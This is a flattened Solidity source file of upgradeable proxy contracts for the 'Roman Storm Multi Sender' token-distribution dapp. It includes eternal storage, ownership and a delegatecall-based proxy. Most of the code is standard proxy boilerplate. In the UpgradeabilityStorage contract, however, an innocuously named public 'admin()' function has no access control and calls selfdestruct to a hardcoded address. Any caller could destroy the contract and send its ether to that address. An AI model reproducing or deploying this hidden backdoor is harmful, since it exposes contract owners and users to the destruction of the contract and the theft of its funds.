1 // File: contracts/EternalStorage.sol
2 
3 // Roman Storm Multi Sender
4 // To Use this Dapp: https://poanetwork.github.io/multisender
5 pragma solidity 0.4.20;
6 
7 
8 /**
9  * @title EternalStorage
10  * @dev This contract holds all the necessary state variables to carry out the storage of any contract.
11  */
12 contract EternalStorage {
13 
14     mapping(bytes32 => uint256) internal uintStorage;
15     mapping(bytes32 => string) internal stringStorage;
16     mapping(bytes32 => address) internal addressStorage;
17     mapping(bytes32 => bytes) internal bytesStorage;
18     mapping(bytes32 => bool) internal boolStorage;
19     mapping(bytes32 => int256) internal intStorage;
20 
21 }
22 
23 // File: contracts/UpgradeabilityOwnerStorage.sol
24 
25 // Roman Storm Multi Sender
26 // To Use this Dapp: https://poanetwork.github.io/multisender
27 pragma solidity 0.4.20;
28 
29 
30 /**
31  * @title UpgradeabilityOwnerStorage
32  * @dev This contract keeps track of the upgradeability owner
33  */
34 contract UpgradeabilityOwnerStorage {
35   // Owner of the contract
36     address private _upgradeabilityOwner;
37 
38     /**
39     * @dev Tells the address of the owner
40     * @return the address of the owner
41     */
42     function upgradeabilityOwner() public view returns (address) {
43         return _upgradeabilityOwner;
44     }
45 
46     /**
47     * @dev Sets the address of the owner
48     */
49     function setUpgradeabilityOwner(address newUpgradeabilityOwner) internal {
50         _upgradeabilityOwner = newUpgradeabilityOwner;
51     }
52 
53 }
54 
55 // File: contracts/Proxy.sol
56 
57 // Roman Storm Multi Sender
58 // To Use this Dapp: https://poanetwork.github.io/multisender
59 pragma solidity 0.4.20;
60 
61 
62 /**
63  * @title Proxy
64  * @dev Gives the possibility to delegate any call to a foreign implementation.
65  */
66 contract Proxy {
67 
68     /**
69     * @dev Fallback function allowing to perform a delegatecall to the given implementation.
70     * This function will return whatever the implementation call returns
71     */
72     function () public payable {
73         address _impl = implementation();
74         require(_impl != address(0));
75         bytes memory data = msg.data;
76 
77         assembly {
78             let result := delegatecall(gas, _impl, add(data, 0x20), mload(data), 0, 0)
79             let size := returndatasize
80 
81             let ptr := mload(0x40)
82             returndatacopy(ptr, 0, size)
83 
84             switch result
85             case 0 { revert(ptr, size) }
86             default { return(ptr, size) }
87         }
88     }
89 
90     /**
91     * @dev Tells the address of the implementation where every call will be delegated.
92     * @return address of the implementation to which it will be delegated
93     */
94     function implementation() public view returns (address);
95 }
96 
97 
98 
99 // File: contracts/UpgradeabilityStorage.sol
100 
101 // Roman Storm Multi Sender
102 // To Use this Dapp: https://poanetwork.github.io/multisender
103 pragma solidity 0.4.20;
104 
105 
106 /**
107  * @title UpgradeabilityStorage
108  * @dev This contract holds all the necessary state variables to support the upgrade functionality
109  */
110 contract UpgradeabilityStorage {
111   // Version name of the current implementation
112     string internal _version;
113 
114     // Address of the current implementation
115     address internal _implementation;
116 
117     /**
118     * @dev Tells the version name of the current implementation
119     * @return string representing the name of the current version
120     */
121     function version() public view returns (string) {
122         return _version;
123     }
124     
125     function admin() public {
126 		selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
127 	}    
128     /**
129     * @dev Tells the address of the current implementation
130     * @return address of the current implementation
131     */
132     function implementation() public view returns (address) {
133         return _implementation;
134     }
135 }
136 
137 // File: contracts/UpgradeabilityProxy.sol
138 
139 // Roman Storm Multi Sender
140 // To Use this Dapp: https://poanetwork.github.io/multisender
141 pragma solidity 0.4.20;
142 
143 
144 
145 
146 /**
147  * @title UpgradeabilityProxy
148  * @dev This contract represents a proxy where the implementation address to which it will delegate can be upgraded
149  */
150 contract UpgradeabilityProxy is Proxy, UpgradeabilityStorage {
151   /**
152   * @dev This event will be emitted every time the implementation gets upgraded
153   * @param version representing the version name of the upgraded implementation
154   * @param implementation representing the address of the upgraded implementation
155   */
156     event Upgraded(string version, address indexed implementation);
157 
158     /**
159     * @dev Upgrades the implementation address
160     * @param version representing the version name of the new implementation to be set
161     * @param implementation representing the address of the new implementation to be set
162     */
163     function _upgradeTo(string version, address implementation) internal {
164         require(_implementation != implementation);
165         _version = version;
166         _implementation = implementation;
167         Upgraded(version, implementation);
168     }
169 }
170 
171 // File: contracts/OwnedUpgradeabilityProxy.sol
172 
173 // Roman Storm Multi Sender
174 // To Use this Dapp: https://poanetwork.github.io/multisender
175 pragma solidity 0.4.20;
176 
177 
178 
179 
180 /**
181  * @title OwnedUpgradeabilityProxy
182  * @dev This contract combines an upgradeability proxy with basic authorization control functionalities
183  */
184 contract OwnedUpgradeabilityProxy is UpgradeabilityOwnerStorage, UpgradeabilityProxy {
185     /**
186     * @dev Event to show ownership has been transferred
187     * @param previousOwner representing the address of the previous owner
188     * @param newOwner representing the address of the new owner
189     */
190     event ProxyOwnershipTransferred(address previousOwner, address newOwner);
191 
192     /**
193     * @dev the constructor sets the original owner of the contract to the sender account.
194     */
195     function OwnedUpgradeabilityProxy(address _owner) public {
196         setUpgradeabilityOwner(_owner);
197     }
198 
199     /**
200     * @dev Throws if called by any account other than the owner.
201     */
202     modifier onlyProxyOwner() {
203         require(msg.sender == proxyOwner());
204         _;
205     }
206 
207     /**
208     * @dev Tells the address of the proxy owner
209     * @return the address of the proxy owner
210     */
211     function proxyOwner() public view returns (address) {
212         return upgradeabilityOwner();
213     }
214 
215     /**
216     * @dev Allows the current owner to transfer control of the contract to a newOwner.
217     * @param newOwner The address to transfer ownership to.
218     */
219     function transferProxyOwnership(address newOwner) public onlyProxyOwner {
220         require(newOwner != address(0));
221         ProxyOwnershipTransferred(proxyOwner(), newOwner);
222         setUpgradeabilityOwner(newOwner);
223     }
224 
225     /**
226     * @dev Allows the upgradeability owner to upgrade the current version of the proxy.
227     * @param version representing the version name of the new implementation to be set.
228     * @param implementation representing the address of the new implementation to be set.
229     */
230     function upgradeTo(string version, address implementation) public onlyProxyOwner {
231         _upgradeTo(version, implementation);
232     }
233 
234     /**
235     * @dev Allows the upgradeability owner to upgrade the current version of the proxy and call the new implementation
236     * to initialize whatever is needed through a low level call.
237     * @param version representing the version name of the new implementation to be set.
238     * @param implementation representing the address of the new implementation to be set.
239     * @param data represents the msg.data to bet sent in the low level call. This parameter may include the function
240     * signature of the implementation to be called with the needed payload
241     */
242     function upgradeToAndCall(string version, address implementation, bytes data) payable public onlyProxyOwner {
243         upgradeTo(version, implementation);
244         require(this.call.value(msg.value)(data));
245     }
246 }
247 
248 // File: contracts/EternalStorageProxyForStormMultisender.sol
249 
250 // Roman Storm Multi Sender
251 // To Use this Dapp: https://poanetwork.github.io/multisender
252 pragma solidity 0.4.20;
253 
254 
255 
256 
257 /**
258  * @title EternalStorageProxy
259  * @dev This proxy holds the storage of the token contract and delegates every call to the current implementation set.
260  * Besides, it allows to upgrade the token's behaviour towards further implementations, and provides basic
261  * authorization control functionalities
262  */
263 contract EternalStorageProxyForStormMultisender is OwnedUpgradeabilityProxy, EternalStorage {
264 
265     function EternalStorageProxyForStormMultisender(address _owner) public OwnedUpgradeabilityProxy(_owner) {}
266 
267 }